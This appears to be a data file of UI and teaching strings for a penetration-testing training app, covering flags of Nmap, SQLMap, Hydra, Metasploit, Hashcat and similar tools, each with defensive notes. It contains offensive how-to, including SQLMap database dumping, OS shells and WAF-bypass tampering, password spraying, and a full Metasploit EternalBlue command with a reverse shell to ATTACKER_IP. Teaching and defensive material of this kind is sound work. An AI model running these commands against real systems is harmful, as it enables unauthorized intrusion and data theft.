nmap.name: Nmap
nmap.description: Network Mapper — the industry-standard tool for host discovery, port scanning, service/version detection, OS fingerprinting, and scripted vulnerability checks. The foundation of every professional recon phase.
nmap.teach_intro: Nmap works by sending carefully crafted packets to the target and analyzing the responses. Different port states (open, closed, filtered) give us a map of the attack surface. Every open port is a potential entry point.

-sV.label: Version Detection
-sV.desc: Probe open ports to determine service name and version. Essential — version info reveals CVEs.
-sV.teach: Version detection sends extra probes after finding open ports. 'Apache 2.4.29' immediately points you to searchsploit and NVD.

-sC.label: Default Scripts
-sC.desc: Run Nmap's default NSE scripts. Grabs banners, enumerates services, checks for common vulns automatically.
-sC.teach: NSE scripts are Lua programs that run against open ports. Default scripts do banner grabbing, SMB enumeration, FTP anonymous check, and more.

-sS.label: SYN Stealth Scan
-sS.desc: Half-open TCP scan. Never completes the handshake — faster and harder to detect.
-sS.teach: SYN scan sends SYN, waits for SYN-ACK (open) or RST (closed). We never send the final ACK — leaves fewer logs.

-sU.label: UDP Scan
-sU.desc: Scan UDP ports. Finds DNS (53), SNMP (161), TFTP (69), NTP (123) — often missed.
-sU.teach: UDP is connectionless — no response usually means open|filtered. SNMP port 161 with 'public' community string is a goldmine.

-O.label: OS Detection
-O.desc: Identify the OS via TCP/IP fingerprinting. Narrows exploit selection dramatically.
-O.teach: OS detection analyzes subtle packet response differences. Windows Server vs Ubuntu changes your entire attack path.

-A.label: Aggressive Scan
-A.desc: OS detection + version + scripts + traceroute. All-in-one.
-A.teach: -A is the Swiss Army knife. Louder but gives max intel in one shot. Great for CTFs and internal assessments.

-p-.label: All 65535 Ports
-p-.desc: Scan every port. Default only scans top 1000. Services on non-standard ports hide here.
-p-.teach: Admins move services to weird ports thinking it's security. SSH on 2222, RDP on 3399, admin panel on 8888 — all missed without -p-.

-p.label: Port Range
-p.desc: Specify exact ports or ranges: -p 22,80,443 or -p 1-1024
-p.teach: Targeted scanning is faster and quieter. Use when you know what services to expect.

--script.label: NSE Script
--script.desc: Run specific scripts: vuln, smb-vuln-ms17-010, http-title, ftp-anon, etc.
--script.teach: smb-vuln-ms17-010 checks EternalBlue. ftp-anon checks anonymous FTP. http-enum finds web paths. Chain them: --script vuln,discovery

--top-ports.label: Top N Ports
--top-ports.desc: Scan N most commonly open ports. --top-ports 1000 covers 99% of real services.
--top-ports.teach: Nmap's port frequency database comes from real internet scans. Top 1000 covers ~99% of services in the wild.

-T4.label: Timing T4 (Fast)
-T4.desc: Aggressive timing for reliable networks. T0=paranoid to T5=insane.
-T4.teach: T1-T2 for IDS evasion. T3 default. T4 for fast LAN. T5 can miss results. Never T5 in production.

-oN.label: Normal Output File
-oN.desc: Save results to a human-readable file for your report.
-oN.teach: Always save output! -oN normal, -oX XML (for Metasploit import), -oG grepable, -oA all formats.

--open.label: Show Open Only
--open.desc: Only display open ports. Cleaner results on large subnet scans.
--open.teach: Large subnet scans return hundreds of 'closed' results. --open filters noise so you only see actionable findings.

-v.label: Verbose
-v.desc: Show results in real time as they're discovered.
-v.teach: With -v you see open ports appear live. Start working on early discoveries while the scan continues.

Quick Recon.desc: Fast top-100 port sweep with version detection.

Full Recon.desc: Service versions + default NSE scripts. Professional standard.

Stealth SYN.desc: Half-open scan, slow timing. Lower IDS detection.

Aggressive All.desc: All ports + OS + scripts + traceroute. Max intel, max noise.

nmap.defend_notes: SYN scans generate RST packets visible in firewall logs. Full connect scans appear in web server access logs. Configure SIEM to alert on port sweeps (single source → multiple destinations in short window). Snort/Suricata have Nmap detection signatures built in.
mitre_techniques: T1595.001 - Active Scanning: Scanning IP Blocks

gobuster.name: Gobuster
gobuster.description: Directory, file, DNS subdomain, and vhost brute forcer. Threaded, fast, and wordlist-driven. One of the first tools to run against any web target after identifying HTTP/HTTPS ports.
gobuster.teach_intro: Gobuster sends HTTP requests for every word in your wordlist and records which ones get non-404 responses. It's fast because it runs dozens of threads simultaneously. Hidden directories, admin panels, backup files, and API endpoints all hide here.

dir.label: Directory Mode
dir.desc: Enumerate directories and files on a web server.
dir.teach: dir mode is the workhorse. Finds /admin, /backup, /.git, /api — all the things devs forgot to protect.

dns.label: DNS Subdomain Mode
dns.desc: Enumerate subdomains by brute forcing DNS. Finds dev, staging, api, admin subdomains.
dns.teach: DNS mode resolves each subdomain. dev.target.com might be running a debug build. mail.target.com reveals mail infra.

vhost.label: Virtual Host Mode
vhost.desc: Enumerate virtual hosts on a web server. Finds hidden vhosts that don't appear in DNS.
vhost.teach: Some vhosts only respond to the right Host: header. Internal admin panels often live as vhosts on the same IP.

-w.label: Wordlist
-w.desc: Path to wordlist. Use dirb/common.txt (small/fast) or dirbuster/directory-list-2.3-medium.txt (thorough).
-w.teach: Wordlist choice matters. common.txt is 4600 words. medium.txt is 220k words. Start small, escalate.

-t.label: Thread Count
-t.desc: Number of concurrent threads. Default 10, safe max ~50 for most servers.
-t.teach: More threads = faster scan but more server load and more log entries. -t 10 is stealthy, -t 50 is aggressive.

-x.label: File Extensions
-x.teach: Extensions unlock backup files. config.php.bak, admin.php, robots.txt.bak — devs leave these everywhere.

-s.label: Status Codes
-s.desc: Only show specific HTTP status codes. Default: 200,204,301,302,307,401,403.
-s.teach: 403 Forbidden means the path EXISTS but you're denied. A 403 is almost as interesting as a 200 — try bypass techniques.

-k.label: Skip TLS Verify
-k.desc: Skip SSL certificate verification. Required for self-signed certs on HTTPS targets.
-k.teach: Most internal HTTPS services use self-signed certs. Without -k gobuster refuses to connect.

-o.label: Output File
-o.teach: Always save output. You'll reference these paths for follow-up requests and report evidence.

--cookies.label: Session Cookies
--cookies.desc: Include cookies for authenticated scanning behind a login.
--cookies.teach: Without cookies gobuster only sees the unauthenticated surface. Add your session cookie to scan the post-login app.

gobuster.defend_notes: Gobuster generates huge volumes of 404s rapidly from one IP. WAFs and IDS detect this pattern immediately. Configure rate limiting on web servers. Alert on >100 requests/minute from a single IP returning 404. Cloudflare and fail2ban both catch this by default.

sqlmap.name: SQLMap
sqlmap.description: The ultimate automated SQL injection detection and exploitation tool. Tests every injection technique (UNION, blind, error-based, time-based, stacked queries) and can dump entire databases, crack hashes, and even get OS shells.
sqlmap.teach_intro: SQL injection tricks the database into running your SQL instead of the app's. SQLMap automates the tedious process of testing every parameter. When it finds injection, it can list databases, tables, and dump all data — up to and including password hashes and OS access.

-u.label: Target URL
-u.desc: The URL to test. Include the parameter: http://target.com/page?id=1
-u.teach: SQLMap tests the id=1 parameter. Every GET/POST parameter is a potential injection point.

--batch.label: Non-Interactive
--batch.desc: Accept default answers to all prompts. Essential for automation.
--batch.teach: --batch makes sqlmap run without pausing to ask questions. Always use this for speed.

--dbs.label: List Databases
--dbs.desc: Enumerate all databases on the server after confirming injection.
--dbs.teach: After finding injection, --dbs shows all databases. Look for: customers, users, wordpress, accounting, hr.

-D.label: Select Database
-D.teach: After seeing database names with --dbs, use -D to drill into one. --tables then shows all tables inside.

-T.label: Select Table
-T.desc: Target a specific table: -D db_name -T table_name --dump
-T.teach: --dump extracts every row from the table. user + password_hash = crackable with hashcat.

--dump.label: Dump Table Data
--dump.desc: Extract all rows from the selected table.
--dump.teach: Dump gives you raw data. SQLMap auto-detects hash types and offers to crack them with a wordlist.

--dump-all.label: Dump Everything
--dump-all.desc: Dump ALL tables from ALL databases. Comprehensive but loud.
--dump-all.teach: Nuclear option — extracts everything. Excellent for evidence collection but extremely loud and slow.

--level.label: Test Level (1-5)
--level.desc: How many tests to run. Level 1=basic, 5=maximum (headers, cookies, user-agent).
--level.teach: Level 1 tests URL params. Level 3 tests cookies. Level 5 tests everything including HTTP headers. More levels = more detection risk.

--risk.label: Risk Level (1-3)
--risk.desc: How risky the tests are. Risk 3 includes UPDATE statements that could modify data.
--risk.teach: Risk 3 sends UPDATE/DELETE payloads that can corrupt data. Only use on targets you have explicit permission to test.

--forms.label: Test All Forms
--forms.desc: Automatically parse and test all HTML forms on the page.
--forms.teach: Login forms, search boxes, contact forms — all are injection candidates. --forms finds and tests them all automatically.

--data.label: POST Data
--data.teach: POST parameters are common injection points in login forms. SQLMap tests them identically to GET params.

--cookie.label: Cookie
--cookie.desc: Include session cookie for authenticated scanning.
--cookie.teach: Many injection points are only accessible post-login. Add your session cookie to test authenticated endpoints.

--os-shell.label: OS Shell
--os-shell.desc: Attempt to get an OS-level interactive shell via the database server.
--os-shell.teach: If MySQL runs as root or MSSQL as sa, --os-shell gives you command execution on the server OS. This is full compromise.

--passwords.label: Dump DB Passwords
--passwords.desc: Extract database user credentials and hashes.
--passwords.teach: Database users have their own password hashes. DBA accounts often reuse passwords across systems.

--tamper.label: Tamper Script
--tamper.desc: Apply WAF bypass tamper scripts: space2comment, between, charencode.
--tamper.teach: WAFs block 'SELECT FROM'. Tamper scripts mangle the payload so it still works but bypasses filters. space2comment replaces spaces with /**/.

--tor.label: Route via Tor
--tor.desc: Route SQLMap traffic through Tor network for anonymity.
--tor.teach: Tor routes through multiple relays making source IP attribution very difficult. Slower but harder to trace.

Detect Only.desc: Safe detection pass — no data extracted.

POST Login Form.desc: Auto-test all POST forms on the page.

OS Shell Hunt.desc: Attempt OS code execution — use with caution.

sqlmap.defend_notes: SQL injection attacks generate distinctive WAF log entries and database error messages. Enable parameterized queries (prepared statements) — the only real fix. WAF rules for UNION/SELECT/DROP patterns catch script kiddie attacks but tamper scripts bypass them. Monitor for unusual database query patterns in your SIEM. SQLMap's time-based blind attacks show as slow queries.
mitre_techniques: T1059.004 - Command and Scripting Interpreter: Unix Shell

nikto.name: Nikto
nikto.description: Web server vulnerability scanner. Tests for 6700+ potentially dangerous files, outdated server software, version-specific problems, and server configuration issues. Fast passive reconnaissance against any HTTP/HTTPS target.
nikto.teach_intro: Nikto checks web servers against a database of known vulnerabilities, dangerous files, and misconfigurations. It's noisy but thorough — every '+' line in the output is a potential finding. Think of it as the first scanner you run against a web target before going deeper.

-h.label: Target Host
-h.desc: Target hostname or IP. Add port with -p if not 80/443.
-h.teach: Every scan starts here. Nikto will probe the host on port 80 by default. Add -ssl for HTTPS.

-p.label: Port
-p.desc: Specify port number if not default 80/443.
-p.teach: Many apps run on 8080, 8443, 8888, or 9000. Always specify the correct port or you'll scan the wrong service.

-ssl.label: Force SSL/HTTPS
-ssl.desc: Force SSL connection. Use for HTTPS targets.
-ssl.teach: Without -ssl on an HTTPS target nikto will fail to connect. Always pair with HTTPS targets.

-Tuning.label: Scan Tuning
-Tuning.teach: Tuning lets you focus on specific vulnerability classes. -Tuning 4 only tests injection points. Reduces noise for targeted recon.

-o.label: Output File
-o.desc: Save results. Format detected by extension: .txt .html .xml .csv
-o.teach: HTML output is easiest to read and share. XML output can be imported into other tools.

-Format.label: Output Format
-Format.desc: Explicitly set output format: htm, csv, txt, xml, msf+.
-Format.teach: msf+ format outputs Metasploit resource script — auto-feeds findings into MSF for exploitation.

-evasion.label: IDS Evasion
-evasion.desc: Evasion techniques: 1=random URI encoding, 2=dir self-ref, 3=premature URL ending.
-evasion.teach: Evasion techniques mangle requests to bypass IDS signatures. Not reliable against modern WAFs but useful against legacy systems.

-id.label: Authentication
-id.teach: If the target uses HTTP Basic Auth, supply credentials with -id. Without this you only see the unauthenticated surface.

-useproxy.label: Use Proxy
-useproxy.teach: Routing through Burp Suite lets you see exactly what Nikto sends and intercept/replay interesting requests.

-timeout.label: Timeout
-timeout.desc: Seconds before giving up on a request. Default 10.
-timeout.teach: Slow servers or high latency targets need a higher timeout. Too low and you miss findings.

Save HTML.desc: Full scan with HTML report output.

nikto.defend_notes: Nikto is extremely loud — it fires thousands of requests including scans for known malicious paths. Web server logs will show massive 404 floods from a single IP. A WAF will flag this immediately. Alert on request volume thresholds. Nikto doesn't respect robots.txt so that path will appear in access logs.

hydra.name: Hydra
hydra.description: Fast and flexible online password brute forcing tool. Supports 50+ protocols: SSH, FTP, HTTP, SMTP, SMB, RDP, MySQL, PostgreSQL, VNC, and more. The industry standard for credential attacks against network services.
hydra.teach_intro: Hydra works by trying username/password combinations against a live service as fast as the network allows. It's online brute forcing — you need network access to the target. Results mean valid live credentials you can use right now. Always have permission before running this.

-l.label: Single Username
-l.teach: Start with common admin usernames: admin, root, administrator, user, test. Often one hits.

-L.label: Username List
-L.desc: Test a list of usernames from file: -L users.txt
-L.teach: Get usernames from OSINT (LinkedIn, email harvesting), LDAP enumeration, or default credential lists.

-p.label: Single Password
-p.desc: Test a single password against all usernames. Good for password spray.
-p.teach: Password spray: try one common password against many accounts. Avoids lockouts. 'Password1!', 'CompanyName2024!' are typical hits.

-P.label: Password List
-P.teach: rockyou.txt has 14 million real-world leaked passwords. Most people use passwords that appear in it.

-t.label: Threads
-t.desc: Parallel tasks per target host. Default 16.
-t.teach: SSH limits connections and may lockout accounts. Use -t 4 for SSH to avoid triggering fail2ban. HTTP can handle -t 64.

-f.label: Stop on First Hit
-f.desc: Stop attacking when the first valid credential is found.
-f.teach: -f saves time and reduces noise once you have working creds. Always use -f in real engagements.

-s.label: Custom Port
-s.desc: Specify non-standard port: -s 2222 for SSH on port 2222.
-s.teach: SSH moved to 2222, HTTP on 8080, FTP on 2121 — always check with nmap first then set the right port.

-V.label: Verbose Mode
-V.desc: Show every login attempt. Verbose output for monitoring progress.
-V.teach: Verbose mode shows each attempt: [22][ssh] host: ... login: admin password: test. Good for watching live progress.

-o.label: Output File
-o.desc: Save found credentials to a file.
-o.teach: Always save credentials. You'll need them for your report, and to reuse across other services on the network.

-e.label: Extra Checks
-e.desc: Try: n=null password, s=same as login, r=reversed login.
-e.teach: -e nsr checks empty password, password=username, and reversed username. Catches lazy admins fast.

-x.label: Password Generator
-x.desc: Generate passwords on the fly: -x MIN:MAX:CHARSET
-x.teach: Generates all combos of lowercase+uppercase+digits between 4-6 chars. For PIN brute force: -x 4:4:1234567890

-C.label: Colon-Separated File
-C.desc: Use user:pass format file instead of separate -L and -P.
-C.teach: Default credential lists in user:pass format are perfect for -C. admin:admin, root:toor, admin:password.

SSH Spray.desc: SSH root brute force, fail2ban-safe threading.

Password Spray.desc: Single password spray across common usernames.

hydra.defend_notes: Brute force attacks generate massive authentication failure logs. Implement: account lockout after 5 failures, fail2ban on SSH, MFA on all remote access, rate limiting on login forms. Monitor for rapid sequential failed logins from one IP. SSH key-based auth makes password brute force impossible. Never expose RDP directly to the internet.

metasploit.name: Metasploit Framework
metasploit.description: The world's most widely used penetration testing framework. Contains 2000+ exploits, 500+ payloads, and hundreds of auxiliary/post modules. Industry standard for exploit development, payload delivery, and post-exploitation.
metasploit.teach_intro: Metasploit organizes attacks into modules: exploits (break in), payloads (what runs after), auxiliaries (scanners/fuzzers), post (after compromise). The workflow is always: search → use → set options → run. msfconsole is your command center.

-q.label: Quiet Mode
-q.desc: Start without the ASCII banner. Faster startup.
-q.teach: The -q flag skips the splash screen. In professional engagements you want clean terminal output.

-x.label: Execute Command
-x.desc: Run MSF commands on startup: -x 'use exploit/...; set RHOSTS ...; run'
-x.teach: -x lets you script MSF. Perfect for automation — pre-load modules and options without manual interaction.

-r.label: Resource Script
-r.desc: Run a .rc script file of MSF commands.
-r.teach: Resource scripts are MSF automation files. db_import nmap.xml; vulns; hosts; services — chain them all.

search.label: Search Modules
search.desc: Search for exploits: search eternalblue / search type:exploit platform:windows
search.teach: Search by CVE, name, platform, or type. 'search type:exploit platform:linux rank:excellent' finds reliable Linux exploits.

use.label: Select Module
use.teach: After search, use the module number or full path. Then 'show options' to see what you need to configure.

set.label: Set Option
set.desc: Configure module options: set RHOSTS 192.168.1.1 / set LHOST 10.10.10.1 / set PAYLOAD windows/x64/meterpreter/reverse_tcp
set.teach: RHOSTS = remote target. LHOST = your IP (the callback). LPORT = your listening port. Always verify with 'show options' before running.

run.label: Execute Module
run.desc: Run the configured module. Also: exploit
run.teach: 'run' and 'exploit' are identical. After getting a shell, you'll see 'meterpreter >' — you're in.

db_import.label: Import Nmap Scan
db_import.desc: Import nmap XML results into MSF database.
db_import.teach: After db_import, run 'hosts' and 'services' to see all discovered systems. MSF tracks your recon automatically.

vulns.label: Show Vulnerabilities
vulns.desc: Display vulnerabilities found by scanners in the MSF database.
vulns.teach: After running scanner auxiliaries, 'vulns' shows all confirmed vulnerabilities. Each one is an exploit candidate.

sessions.label: List Sessions
sessions.teach: sessions -l lists all open connections. sessions -i 1 interacts with session 1. You can have dozens open simultaneously.

background.label: Background Session
background.desc: Background the current session and return to msfconsole.
background.teach: Hit Ctrl+Z or type 'background' to background a Meterpreter session. Return with 'sessions -i [id]'.

flags: 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; run'
'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS 1-1024; run'
'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'

metasploit.defend_notes: Meterpreter lives in memory and avoids touching disk — traditional AV misses it. EDR solutions (CrowdStrike, SentinelOne) detect process injection and C2 beaconing. Monitor for: unusual LSASS access, PowerShell spawning from unexpected parents, outbound connections on 4444/4445. Metasploit's default staging port (4444) is trivially blocked by egress filtering.

hashcat.name: Hashcat
hashcat.description: The world's fastest password recovery tool. GPU-accelerated cracking of MD5, SHA1, SHA256, bcrypt, NTLM, WPA2, and 300+ hash types. Can process billions of candidates per second on modern GPUs.
hashcat.teach_intro: Hashcat doesn't try to 'decrypt' hashes — it generates candidates and hashes them, comparing to your target. On a modern GPU it can try billions of passwords per second. The key is attack mode: dictionary (-a 0), combinator (-a 1), bruteforce (-a 3), rule-based (-a 0 with -r).

-m.label: Hash Type
-m.teach: Always identify the hash type first. Use hash-identifier or hashid. Wrong -m = zero results. NTLM (1000) is Windows, MD5 (0) is common web apps.

-a.label: Attack Mode
-a.teach: Mode 0 (dictionary) with rockyou.txt cracks 60-80% of real-world hashes. Mode 3 (brute force) with masks covers the rest.

-r.label: Rule File
-r.desc: Apply transformation rules to wordlist: -r rules/best64.rule
-r.teach: Rules transform words: password → P@ssw0rd!, admin → Admin123. best64.rule applies 64 transformations to every word — multiplies your coverage massively.

--show.label: Show Cracked
--show.desc: Display previously cracked hashes from the potfile.
--show.teach: Hashcat saves cracked passwords in ~/.hashcat/hashcat.potfile. --show retrieves them without cracking again.

--wordlist.label: Wordlist
--wordlist.desc: Path to wordlist. rockyou.txt is default, seclists has many specialized lists.
--wordlist.teach: rockyou.txt (14M passwords) covers most. For targeted attacks, generate custom wordlists with CeWL from the target's website.

-O.label: Optimized Kernels
-O.desc: Enable optimized kernels — faster but limited to max 32 char passwords.
-O.teach: -O nearly doubles cracking speed. Most real passwords are under 32 chars so this is usually safe to use.

--increment.label: Brute Force Increment
--increment.desc: Start brute force from min length and increment up. Use with -a 3.
--increment.teach: ?a = all chars. Start with 4 chars and work up to 8. Catches short passwords first before long ones.

--status.label: Status Update
--status.desc: Show real-time status of cracking session.
--status.teach: Press 's' during cracking to get status. Shows speed, progress percentage, estimated time remaining.

MD5 Dict.desc: MD5 dictionary attack with optimized kernels.

Brute 8 Char.desc: Full brute force up to 8 character passwords.

hashcat.defend_notes: Strong hashing algorithms (bcrypt, Argon2, scrypt) slow GPU cracking dramatically. bcrypt with cost factor 12 takes minutes per hash vs billions/second for MD5. Never store plaintext or MD5/SHA1 passwords. Enforce password complexity to reduce wordlist hits. Salted hashes prevent rainbow table attacks.

john.name: John the Ripper
john.description: Classic CPU-based password cracker. Auto-detects hash types, cracks /etc/shadow files, ZIP/RAR passwords, SSH key passphrases, Office documents. Where hashcat uses GPU power, John uses smart wordlist mangling and CPU efficiency.
john.teach_intro: John auto-detects hash formats and applies built-in mangling rules. It's slower than hashcat on simple hashes but excels at cracking files (ZIP, PDF, SSH keys) via its companion tools: zip2john, ssh2john, pdf2john. The workflow is: convert the file to a John-format hash, then crack it.

--wordlist.label: Wordlist Mode
--wordlist.teach: Most cracks happen here. rockyou.txt covers real-world passwords. John applies mangling rules on top automatically.

--format.label: Force Hash Format
--format.desc: Specify hash type when auto-detect fails: --format=NT, --format=sha512crypt, --format=bcrypt.
--format.teach: Auto-detect usually works. Force it when you know the hash type. Use 'john --list=formats' to see all supported types.

--rules.label: Mangling Rules
--rules.desc: Apply transformation rules to the wordlist.
--rules.teach: Rules transform: password → P@ssword1!, admin → @dm1n. John's built-in rules are aggressive and catch common substitutions.

--incremental.label: Brute Force Mode
--incremental.desc: Full character brute force. Slow but thorough.
--incremental.teach: Incremental tries all character combinations. Use as last resort — can take days for long passwords.

--show.label: Show Cracked
--show.desc: Display all cracked passwords from the session.
--show.teach: John saves cracked passwords in ~/.john/john.pot. --show reads them back without re-cracking.

--pot.label: Potfile Location
--pot.teach: Useful when sharing cracking sessions or keeping separate potfiles per engagement.

--fork.label: Multi-Process
--fork.desc: Run N parallel John processes on multi-core CPU.
--fork.teach: Use all CPU cores: --fork=4 for quad-core. Not as fast as GPU but great for file cracking where GPU can't help.

SSH Key.desc: Crack SSH private key passphrase (run ssh2john first).

ZIP Password.desc: Crack ZIP archive password (run zip2john first).

john.defend_notes: Same mitigations as hashcat — use strong hashing algorithms. For file encryption: use AES-256 with strong passphrases. SSH keys should use ED25519 with a strong passphrase. For Linux systems: use yescrypt or bcrypt in /etc/pam.d/common-password instead of SHA512.

ffuf.name: FFUF
ffuf.description: Fuzz Faster U Fool — extremely fast web fuzzer written in Go. Used for directory brute forcing, parameter fuzzing, virtual host discovery, and API endpoint enumeration. Often faster than gobuster with more flexible filtering.
ffuf.teach_intro: FFUF replaces the keyword FUZZ in a URL/header/body with wordlist entries. It's incredibly versatile — fuzz directories, GET/POST parameters, headers, cookies, or anything. The filtering options (-fc, -fs, -fw, -fl) let you hide noise and surface only interesting responses.

-u.label: URL with FUZZ
-u.desc: Target URL. Place FUZZ where you want to inject wordlist entries.
-u.teach: FUZZ is a placeholder. It can go anywhere in the URL: /FUZZ, /?param=FUZZ, in headers. Multiple FUZZ positions are possible.

-w.label: Wordlist
-w.desc: Wordlist file path. Use W1:FILE syntax for multiple wordlists.
-w.teach: For dir fuzzing: dirb/common.txt (fast) or dirbuster/directory-list-2.3-medium.txt (thorough). For params: burp-parameter-names.txt from seclists.

-fc.label: Filter Status Code
-fc.desc: Hide responses with specific HTTP status codes: -fc 404,400
-fc.teach: Filter out 404s to see only valid paths. Add -fc 403 to hide forbidden too, or keep 403s — they mean the path exists.

-fs.label: Filter Size
-fs.desc: Hide responses of specific byte size: -fs 1234 (hides the 'not found' page size).
-fs.teach: Most 'not found' pages are the same size. Find out the size of the 404 page with curl, then filter it out. Everything else is interesting.

-fw.label: Filter Word Count
-fw.desc: Hide responses with specific word count.
-fw.teach: Alternative to -fs when the server varies 404 sizes. Word count is more stable than byte count for detecting real content.

-mc.label: Match Status Code
-mc.desc: Only show responses with specific status codes: -mc 200,301,302,403
-mc.teach: Whitelist approach vs blacklist (-fc). Only show what you care about. 200 = accessible, 301 = redirects, 403 = exists but forbidden.

-t.label: Threads
-t.teach: FFUF defaults to 40 threads which is already fast. -t 80+ on reliable servers. Reduce to 10 for rate-limited targets.

-H.label: Custom Header
-H.desc: Add custom HTTP header: -H 'Host: FUZZ' for vhost fuzzing.
-H.teach: Virtual host fuzzing! Change the Host header to discover hidden vhosts on the same IP. Internal apps often lurk here.

-d.label: POST Data
-d.desc: Send POST request with fuzz point in body.
-d.teach: POST body fuzzing finds parameter vulnerabilities. FUZZ in the username or password field can reveal SQLi, XSS, or logic flaws.

-o.label: Output File
-o.teach: JSON output is parseable — pipe it into jq for filtering. HTML output is great for reports.

-recursion.label: Recursive Mode
-recursion.teach: Recursion finds /admin/config/, /api/v1/users/ etc. Set -recursion-depth 2-3 to avoid infinite loops.

-e.label: Extensions
-e.teach: Extensions turn 'admin' into 'admin.php', 'admin.bak', 'admin.txt'. Backup files (.bak, .old, ~) are goldmines.

ffuf.defend_notes: FFUF generates massive 404 floods identifiable by request volume and sequential path patterns. WAFs detect this automatically. Rate limiting, Cloudflare, and fail2ban all catch directory fuzzing. Consider returning identical responses for all non-existent paths (same size/content) to defeat size-based filtering.

burpsuite.name: Burp Suite
burpsuite.description: The premier web application security testing platform. Intercepts, modifies, and replays HTTP/HTTPS traffic. Includes: Proxy, Repeater, Intruder (fuzzer), Scanner, Decoder, Sequencer, and Comparer. Used by nearly every professional web pen tester.
burpsuite.teach_intro: Burp Suite sits between your browser and the web server, capturing every request and response. You can pause requests, modify them, replay them, and send them to specialized tools. The Proxy tab shows live traffic. Repeater lets you modify and resend. Intruder automates fuzzing.

--project-file.label: Project File
--project-file.desc: Load/create a project file to save work between sessions.
--project-file.teach: Project files save all captured traffic, findings, and notes. Always create a project file for real engagements.

--config-file.label: Config File
--config-file.desc: Load Burp configuration from JSON file.
--config-file.teach: Config files let you pre-configure proxy settings, scope, and scan options. Great for consistent engagement setup.

Proxy.label: Intercept Mode
Proxy.desc: The core feature — intercept HTTP/HTTPS between browser and server.
Proxy.teach: Set your browser proxy to 127.0.0.1:8080. All traffic flows through Burp. Toggle Intercept to pause/modify requests before they reach the server.

Repeater.label: Repeater Tab
Repeater.desc: Modify and resend individual HTTP requests manually. Right-click any request → Send to Repeater.
Repeater.example: Right-click request → Send to Repeater → Modify → Send
Repeater.teach: Repeater is where you probe for vulnerabilities. Change parameter values, inject payloads, see exactly how the server responds. Manual testing at its finest.

Intruder.label: Intruder (Fuzzer)
Intruder.desc: Automated fuzzing/brute forcing. Mark payload positions with § symbols. Right-click → Send to Intruder.
Intruder.example: Send login request to Intruder, mark password field, set payload list, attack
Intruder.teach: Intruder attack types: Sniper (one position, one list), Battering Ram (same payload everywhere), Pitchfork (multiple lists in sync), Cluster Bomb (all combos).

Decoder.label: Decoder Tab
Decoder.desc: Encode/decode: Base64, URL, HTML, hex, gzip, JWT etc.
Decoder.example: Paste token → Decode as Base64 → Decode as URL → see plaintext
Decoder.teach: JWT tokens, session cookies, and hidden fields are often encoded. Decode them to find embedded data like user IDs, permissions, or expiry timestamps.

Comparer.label: Comparer Tab
Comparer.desc: Diff two requests or responses to spot differences.
Comparer.example: Send two responses to Comparer → compare word/byte differences
Comparer.teach: Compare successful vs failed login responses. Even tiny differences reveal logic flaws — different word counts, error messages, or response times.

Start Proxy.desc: Launch Burp Suite GUI. Configure browser to use 127.0.0.1:8080.

With Project.desc: Launch with a saved project file.

burpsuite.defend_notes: Burp Suite attacks are typically manual and targeted — harder to detect via volume alone. Look for unusual headers (X-Burp, User-Agent: Burp), sequential parameter manipulation in logs, and repeated identical requests with slight variations. The Community edition throttles Intruder attacks — Pro bypasses this. Implement WAF rules for known Burp payload patterns.

nuclei.name: Nuclei
nuclei.description: Fast, template-based vulnerability scanner. Runs thousands of community-maintained YAML templates against targets. Checks for CVEs, misconfigurations, exposed panels, default credentials, XSS, SQLi, SSRF, and more. ProjectDiscovery's flagship scanner.
nuclei.teach_intro: Nuclei uses YAML templates — each one describes how to detect a specific vulnerability. The community maintains 6000+ templates covering every CVE you can think of. It's the fastest way to scan for known vulnerabilities across a large number of targets.

-u.label: Single URL Target
-u.teach: Single target mode. Nuclei runs all matching templates and reports findings with severity ratings.

-l.label: Target List
-l.desc: File containing list of URLs to scan.
-l.teach: Mass scanning — feed nuclei a list of URLs from subfinder/httpx output. Covers entire web attack surface at once.

-t.label: Specific Template
-t.desc: Run a specific template or directory of templates.
-t.teach: Run specific CVE templates for targeted testing. nuclei -t cves/ tests all CVE templates. nuclei -t exposures/ finds exposed sensitive data.

-s.label: Severity Filter
-s.desc: Filter by severity: critical, high, medium, low, info.
-s.teach: Start with critical and high. Info templates generate a lot of noise. Focus on actionable findings first.

-tags.label: Tag Filter
-tags.teach: Tags let you target specific vuln classes. -tags rce finds remote code execution opportunities. -tags default-login checks default credentials.

-c.label: Concurrency
-c.desc: Number of parallel template executions. Default 25.
-c.teach: Higher concurrency = faster scans. On stable targets use -c 50-100. Reduce for rate-limited or sensitive targets.

-o.label: Output File
-o.teach: Always save output. Nuclei findings with CVE numbers are ready-made report evidence.

-json.label: JSON Output
-json.desc: Output results in JSON format for parsing.
-json.teach: JSON output integrates with other tools and SIEM platforms. Each finding includes template name, severity, matched value, and URL.

-rl.label: Rate Limit
-rl.teach: Rate limiting prevents overwhelming the target and triggering WAF blocks. Use -rl 10-50 for sensitive production targets.

-headless.label: Headless Browser
-headless.desc: Enable headless Chrome for JavaScript-rendered targets.
-headless.teach: Single-page apps and React/Angular frontends need headless mode. Nuclei uses Chrome to render JS before scanning.

Mass Scan.desc: Mass scan from URL list file.

nuclei.defend_notes: Nuclei generates distinctive HTTP patterns matching known exploit signatures. WAFs with CVE rule sets (Cloudflare, AWS WAF, ModSecurity CRS) block most templates. Keep software updated — Nuclei's power comes from known vulnerabilities. Subscribe to NVD and vendor advisories for early warning.

subfinder.name: Subfinder
subfinder.description: Passive subdomain discovery tool. Queries 40+ public data sources (Certificate Transparency, DNS databases, APIs, Shodan, VirusTotal) without sending any packets to the target. Completely passive OSINT recon.
subfinder.teach_intro: Subfinder finds subdomains without touching the target — it asks public databases. dev.target.com, staging.target.com, api.target.com, vpn.target.com — all potentially exposed and forgotten. Attack surface is almost always larger than the main domain suggests.

-d.label: Target Domain
-d.desc: Root domain to enumerate subdomains for.
-d.teach: Give subfinder the apex domain. It queries CT logs, VirusTotal, Shodan, and 40+ other sources. dev, staging, api subdomains frequently have weaker security.

-silent.label: Silent Mode
-silent.desc: Only output found subdomains. Perfect for piping into other tools.
-silent.teach: Silent mode is pipeline-ready. Output goes straight to httpx (check which are live) → then nuclei (scan each one).

-o.label: Output File
-o.teach: Save the list. Feed it to gobuster (dns mode), ffuf (vhost mode), httpx (aliveness check), then nuclei (scan all live ones).

-all.label: All Sources
-all.desc: Use all available data sources (requires API keys for some).
